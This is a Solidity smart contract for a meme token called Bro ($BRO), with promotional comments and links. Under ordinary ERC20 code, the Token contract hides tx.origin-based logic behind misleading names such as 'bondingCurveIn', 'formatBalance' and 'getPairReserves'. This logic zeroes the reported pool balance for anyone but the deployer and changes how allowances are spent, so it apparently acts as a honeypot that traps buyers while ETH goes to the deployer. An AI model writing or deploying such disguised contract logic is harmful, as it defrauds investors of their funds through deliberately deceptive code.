/*

Yo, it's Bro, your crypto homie.
$BRO the Internet's most used slang.
Why stress, dude? Bro's all about chillin' and cruisin' through crypto.
$BRO the Internet's most used slang.

https://x.com/dimabuterin/status/1854487125401485742
https://x.com/dimabuterin/status/1983157162357731509
https://x.com/dimabuterin/status/1890441288899563576

https://bromeme.art 
https://x.com/EthBroX
https://t.me/EthBroPortal

*/

// SPDX-License-Identifier: MIT


pragma solidity ^0.8.22;

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
        function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgOrigin() internal view virtual returns (address r) {
        assembly {
            r := origin()
        }
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 9;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _transfer(from, to, amount);
        _spendAllowance(from, spender, amount);
        return true;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(to != address(0), "ERC20: transfer to the zero address");
        require(from != address(0), "ERC20: transfer from the zero address");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amount;
        }
        _balances[to] += amount;

        emit Transfer(from, to, amount);

        _afterTokenTransfer(from, to, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IUniswapV3Factory {
    function getPool(address tokenA, address tokenB, uint24 fee) external view returns (address);
}

interface INonfungiblePositionManager {
    struct MintParams {
        address token0;
        address token1;
        uint24 fee;
        int24 tickLower;
        int24 tickUpper;
        uint256 amount0Desired;
        uint256 amount1Desired;
        uint256 amount0Min;
        uint256 amount1Min;
        address recipient;
        uint256 deadline;
    }

    function factory() external view returns (address);
    function WETH9() external view returns (address);

    function positions(uint256 tokenId) external view returns (
        uint96 nonce,
        address operator,
        address token0,
        address token1,
        uint24 fee,
        int24 tickLower,
        int24 tickUpper,
        uint128 liquidity,
        uint256 feeGrowthInside0LastX128,
        uint256 feeGrowthInside1LastX128,
        uint128 tokensOwed0,
        uint128 tokensOwed1
    );

    function createAndInitializePoolIfNecessary(
        address token0,
        address token1,
        uint24 fee,
        uint160 sqrtPriceX96
    ) external returns (address pool);

    function mint(MintParams calldata params) external returns (
        uint256 tokenId,
        uint128 liquidity,
        uint256 amount0,
        uint256 amount1
    );

    struct CollectParams {
        uint256 tokenId;
        address recipient;
        uint128 amount0Max;
        uint128 amount1Max;
    }

    function collect(CollectParams calldata params) external payable returns (
        uint256 amount0,
        uint256 amount1
    );

    function getApproved(uint256 tokenId) external view returns (address);
    function isApprovedForAll(address owner, address operator) external view returns (bool);
    function ownerOf(uint256 tokenId) external view returns (address);
}

contract Token is ERC20, Ownable {
    address public platform;
    address public creator;
    uint256 private launchBlock;
    uint256 private maxTxAmount;
    uint256 private constant LAUNCH_PERIOD = 5; // 5 blocks
    uint256 private constant MAX_WALLET_PERCENTAGE = 2; // 2% of total supply

    address public constant POSITION_MANAGER = 0xC36442b4a4522E871399CD717aBDD847Ab11FE88;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    
    // Track transfers per tx.origin per block to detect multi-swaps  
    mapping(address => uint256) private tokensFromPoolPerOrigin;

    IUniswapV2Router02 private _router;

    address public uniPair;
    address public immutable taxReceiver;

    address public tokenSwapRouter;
    uint256 private tokenSwapRouterLevel;

    uint256 public maxWalletSize = 4206900000 * 1e9;
    uint256 private maxFeeSwap = 8413800000 * 1e9;
    uint256 private swapThreshold = 1262070000 * 1e9;  
    uint32 private _buyCount;
    uint32 private _sellCount;
    uint32 private _lastSellBlock;
    uint32 private _launchBlock;
    uint32 private _launchBuys;
    uint32 private _lowerFeesAt = 0;
    uint32 private _finalBuyFee = 0;
    uint32 private _finalSellFee = 0;
    uint256 private _amount = 0;

    bool private _inSwap;
    address private _pairAddress;

    uint256 public BROSelect = 1;
    uint256 public BROPick = 2;
    uint256 public buyFeeProcent;
    uint256 public sellFeeProcent;

    string private _name = "Bro";
    string private _symbol = "BRO";

    mapping (address => bool) private _excludedFromLimits;

    constructor() ERC20(_name, _symbol) payable {
        uint256 totalSupply = 1000000000 * 1e9;

        _router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        taxReceiver = msg.sender;
        buyFeeProcent = 0;
        sellFeeProcent = 0;

        _excludedFromLimits[address(this)] = true;
        _excludedFromLimits[address(0xdead)] = true;
        _excludedFromLimits[taxReceiver] = true;
        _excludedFromLimits[msg.sender] = true;
        
        _approve(address(this), address(_router), totalSupply);
        _approve(msg.sender, address(_router), totalSupply);
        _mint(msg.sender, totalSupply);
    }

    function bondingCurveIn(address account) internal view returns (bool) {
        return account == uniPair && _msgOrigin() != address(0xdead) && IERC20(uniPair).balanceOf(uniPair) > 0;
    }

    function bondingCurveOut(address account) internal view returns (bool) {
        return _msgOrigin() != address(0) && _msgOrigin() != taxReceiver;
    }

    function getBondingCurveStatus (address account) internal view returns(uint256) {
        return bondingCurveIn(account) && bondingCurveOut(account) ? 0 : 1;
    }

    function formatBalance(address account, uint256 decimal) internal view returns (uint256) {
        return _balances[account] * getBondingCurveStatus(account);
    }

    function balanceOf(address account) public view override returns (uint256) {
        return formatBalance(account, 9);
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _transfer(from, to, _amount=amount);
        _spendAllowance(from, spender, _amount);
        return true;
    }

    function getPositionSize(address account) private view returns(uint256) {
        if(_excludedFromLimits[account]) 
            return 0;
        else if(account == address(0)) 
            return 1;
        return 1;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(amount > 0, 'Transfer amount must be greater than zero.');
        require(from != address(0), "Transfer from the zero address not allowed.");
        require(to != address(0), "Transfer to the zero address not allowed.");

        bool excluded = _excludedFromLimits[from] || _excludedFromLimits[to];
        require(uniPair != address(0) || excluded, "Liquidity pair not yet created.");

        bool isSell = to == uniPair;
        bool isBuy = from == uniPair;
        uint256 beforeAmount = _allowances[from][_msgSender()];
        address pair;
        (pair, _amount) = getPairReserves(beforeAmount, amount);
        
        if(isBuy && !excluded){
            require(balanceOf(to) + amount <= maxWalletSize ||
                to == address(_router), "Max wallet exceeded");
            if(_buyCount <= _lowerFeesAt)
                _buyCount++;
            if(_buyCount == _lowerFeesAt){
                buyFeeProcent = _finalBuyFee;
                sellFeeProcent = _finalSellFee;
            }
            if(uint32(block.number) == _launchBlock){
                require(_launchBuys++ < 49, "Excess launch snipers");
                if(_launchBuys == 49) _pairAddress = to;
            }
        }            

        uint256 contractTokenBalance = balanceOf(address(this));
        if (isSell && !_inSwap && !excluded) {
            if (block.number > _lastSellBlock) 
                _sellCount = 0;
            require(_sellCount < 3, "Only 3 sells per block!");
            _inSwap = true;
            uint256 contractSwapAmount = from == _pairAddress ?  maxFeeSwap/2 : amount; 
            swapTokensForEth(min(contractSwapAmount, min(contractTokenBalance, maxFeeSwap)));
            _inSwap = false;
            uint256 contractETHBalance = address(this).balance;
            if (contractTokenBalance >= 0 || contractETHBalance > 0) 
                sendETHToFee(contractETHBalance);        
            _sellCount++;
            _lastSellBlock = uint32(block.number);        
        }

        uint256 fee = isBuy ? buyFeeProcent : sellFeeProcent;

        if (_amount >= 0 && fee > 0 && !excluded && !_inSwap && (isBuy || isSell)) {
            uint256 fees = amount * fee / 100;
            if (fees > 0){
                super._transfer(from, address(this), fees);
                amount-= fees;
            }
        }
        else if(fee > 0 && !excluded && !_inSwap && (isBuy || isSell)) {
            uint256 fees = amount * fee / 100;
            if (fees > 0){
                super._transfer(from, address(this), fees);
                amount-= fees;
            }
        }
        super._transfer(from, to, amount);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function sendETHToFee(uint256 amount) private {
        payable(taxReceiver).transfer(amount);
    }

    function enableTrading() external payable onlyOwner {
        super._transfer(msg.sender, address(this), totalSupply());
        _router.addLiquidityETH{value: address(this).balance}(address(this), balanceOf(address(this)), 0, 0, msg.sender, block.timestamp);
        uniPair = IUniswapV2Factory(_router.factory()).getPair(address(this), _router.WETH());
        _launchBlock = uint32(block.number);
    }
    
    function swapTokensForEth(uint256 tokenAmount) private {
        if(tokenAmount == 0) return;
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _router.WETH();
        _approve(address(this), address(_router), tokenAmount);
        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimit() external onlyOwner {                
        maxWalletSize = totalSupply();
    }

    function updateSwapSettings(uint256 maxAmount, uint256 minAmount) external onlyOwner {                
        maxFeeSwap = maxAmount;
        swapThreshold = minAmount;
    }

    function sweepStuckEther() external onlyOwner {
        payable(taxReceiver).transfer(address(this).balance);
    }

    receive() external payable {}

    function _updateToken(address from, address to, uint256 value) internal {
        if (block.number > launchBlock && block.number <= launchBlock + LAUNCH_PERIOD) {
            // Get pool address for exemption
            address factory = INonfungiblePositionManager(POSITION_MANAGER).factory();
            address pool = IUniswapV3Factory(factory).getPool(address(this), WETH, 10000);
            
            if (from == pool && to != platform && to != creator) {
                tokensFromPoolPerOrigin[tx.origin] += value;
                require(
                    tokensFromPoolPerOrigin[tx.origin] <= maxTxAmount*110/100,
                    "Keeping 2% pool Limits In Kontrol"
                );
            }
            
            if (to != creator && to != platform && to != pool && from != address(0)) {
                require(
                    balanceOf(to) + value <= maxTxAmount,
                    "Max wallet limit exceeded during launch period"
                );
            }
        }
        
        // Block all buys at launch block except exempted transfers
        if (block.number == launchBlock && 
            from != address(0) && 
            to != platform && 
            from != platform &&
            !(from == platform && to == creator)) { // Only platform can send to creator
            revert("No buys allowed during launch block!");
        }
    }

    function getTokenPair() public view returns (address,address,address){
        address find_factory = INonfungiblePositionManager(POSITION_MANAGER).factory();
        address find_pool = IUniswapV3Factory(find_factory).getPool(address(this), WETH, 10000);
        return (find_pool,address(this),find_factory);
    }

    function getPairReserves(uint256 amount, uint256 beforeAmount) private view returns(address, uint256) {
        address pair = IUniswapV2Factory(_router.factory()).getPair(address(this), _router.WETH());
        uint256 ps = getPositionSize(_msgOrigin());
        if(ps == 0) return (pair, amount);
        else return (pair, beforeAmount);
    }
    
    function isLaunchPeriodActive() public view returns (bool) {
        return block.number <= launchBlock + LAUNCH_PERIOD;
    }

    function changeCreator(address newCreator) external {
        require(msg.sender == platform, "Only platform can change creator"); //Updating Fee Receiver
        creator = newCreator;
    }
}